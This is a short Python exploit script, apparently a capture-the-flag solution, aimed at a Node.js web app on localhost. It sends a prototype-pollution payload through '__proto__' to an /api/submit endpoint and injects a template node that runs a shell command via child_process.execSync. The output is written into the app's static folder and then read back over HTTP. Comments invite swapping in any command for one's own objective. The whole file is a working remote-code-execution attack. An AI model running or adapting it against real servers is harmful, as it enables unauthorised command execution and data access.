import requests

TARGET_URL = 'http://localhost:1555' # please enter info

r = requests.post(TARGET_URL + '/api/submit', json = {
    "artist.name":"Westaway",
    "__proto__.block": {
        "type": "Text", 
      # based on your objective, you can change the commands running on this line
        "line": "process.mainModule.require('child_process').execSync(`ls > /app/static/out`)"
    }
})

print(r.status_code)
print(r.text)

# This payload returns the file the payload created inside the static folder
# This is a great technique because the file outputted in line 13 is accessible externally because it is the application
# is serving static files inside the "/static" folder
print(requests.get(TARGET_URL+'/static/out').text)